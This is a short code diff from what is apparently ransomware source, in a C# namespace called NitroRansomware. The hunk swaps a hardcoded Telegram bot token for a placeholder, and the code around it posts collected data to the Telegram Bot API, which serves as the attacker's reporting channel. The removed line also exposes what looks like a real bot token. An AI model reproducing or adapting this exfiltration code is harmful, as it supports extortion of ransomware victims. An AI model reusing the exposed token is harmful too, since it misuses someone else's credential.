@@ -25,7 +25,7 @@ namespace NitroRansomware
             {
                 using (HttpClient client = new HttpClient())
                 {
-                    string TelegramToken = "6006307805:AAEDDUx2GEUK5B9sfISAl5uogpVR7Py-iFY"; //Put your telegram token here
+                    string TelegramToken = "Put your telegram token here"; //Put your telegram token here
                     var apiUrl = $"https://api.telegram.org/bot{TelegramToken}/sendMessage";
                     await client.PostAsync(apiUrl, new FormUrlEncodedContent(data));
                 }
